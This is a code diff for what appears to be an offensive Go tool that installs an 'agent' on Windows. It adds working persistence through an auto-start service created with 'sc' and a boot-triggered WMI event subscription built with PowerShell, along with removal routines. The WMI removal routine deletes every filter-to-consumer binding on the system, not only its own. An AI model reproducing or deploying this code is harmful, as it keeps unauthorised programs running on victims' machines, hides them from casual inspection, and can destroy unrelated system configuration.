@@ -96,8 +96,12 @@ func setupWindowsPersistence(method, name, agentPath string, args []string) erro
 		return setupScheduledTask(name, agentPath, args, "DAILY")
 	case "startup_folder":
 		return setupStartupFolder(name, agentPath, args)
+	case "service":
+		return setupWindowsService(name, agentPath, args)
+	case "wmi_event":
+		return setupWMISubscription(name, agentPath, args)
 	default:
-		return fmt.Errorf("unknown Windows persistence method: %s. Available: registry_run, schtasks_onlogon, schtasks_daily, startup_folder", method)
+		return fmt.Errorf("unknown Windows persistence method: %s. Available: registry_run, schtasks_onlogon, schtasks_daily, startup_folder, service, wmi_event", method)
 	}
 }
 
@@ -111,9 +115,86 @@ func removeWindowsPersistence(method, name string) error {
 		return removeScheduledTask(name)
 	case "startup_folder":
 		return removeStartupFolder(name)
+	case "service":
+		return removeWindowsService(name)
+	case "wmi_event":
+		return removeWMISubscription(name)
 	default:
-		return fmt.Errorf("unknown Windows persistence method: %s. Available: registry_run, schtasks_onlogon, schtasks_daily, startup_folder", method)
+		return fmt.Errorf("unknown Windows persistence method: %s. Available: registry_run, schtasks_onlogon, schtasks_daily, startup_folder, service, wmi_event", method)
 	}
+}
+
+func setupWindowsService(name, agentPath string, args []string) error {
+	binPath := fmt.Sprintf("\"%s\"", agentPath)
+	if len(args) > 0 {
+		binPath += " " + strings.Join(args, " ")
+	}
+
+	// Create service
+	out, err := exec.Command("sc", "create", name,
+		"binPath=", binPath,
+		"start=", "auto",
+		"DisplayName=", name,
+	).CombinedOutput()
+	if err != nil {
+		return fmt.Errorf("sc create failed: %v — %s", err, out)
+	}
+
+	// Start it immediately
+	exec.Command("sc", "start", name).Run()
+	fmt.Printf("[+] Windows service '%s' created and started\n", name)
+	return nil
+}
+
+func removeWindowsService(name string) error {
+	exec.Command("sc", "stop", name).Run()
+	out, err := exec.Command("sc", "delete", name).CombinedOutput()
+	if err != nil {
+		return fmt.Errorf("sc delete failed: %v — %s", err, out)
+	}
+	fmt.Printf("[+] Windows service '%s' deleted\n", name)
+	return nil
+}
+
+func setupWMISubscription(name, agentPath string, args []string) error {
+	cmdLine := agentPath
+	if len(args) > 0 {
+		cmdLine += " " + strings.Join(args, " ")
+	}
+
+	// Build PowerShell WMI event subscription (runs on next boot via __EventFilter + CommandLineEventConsumer)
+	ps := fmt.Sprintf(`
+$filterName  = '%s_filter'
+$consumerName = '%s_consumer'
+$query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120"
+$filter   = Set-WmiInstance -Namespace root\subscription -Class __EventFilter   -Arguments @{Name=$filterName;  EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query=$query}
+$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name=$consumerName; CommandLineTemplate='%s'}
+Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}
+Write-Output "WMI subscription created"
+`, name, name, cmdLine)
+
+	out, err := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", ps).CombinedOutput()
+	if err != nil {
+		return fmt.Errorf("WMI subscription failed: %v — %s", err, out)
+	}
+	fmt.Printf("[+] WMI event subscription '%s' created\n", name)
+	return nil
+}
+
+func removeWMISubscription(name string) error {
+	ps := fmt.Sprintf(`
+Get-WmiObject -Namespace root\subscription -Class __EventFilter          | Where-Object {$_.Name -eq '%s_filter'}   | Remove-WmiObject
+Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -eq '%s_consumer'} | Remove-WmiObject
+Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
+Write-Output "WMI subscription removed"
+`, name, name)
+
+	out, err := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", ps).CombinedOutput()
+	if err != nil {
+		return fmt.Errorf("WMI removal failed: %v — %s", err, out)
+	}
+	fmt.Printf("[+] WMI event subscription '%s' removed\n", name)
+	return nil
 }
 
 func setupRegistryRun(name, agentPath string, args []string) error {
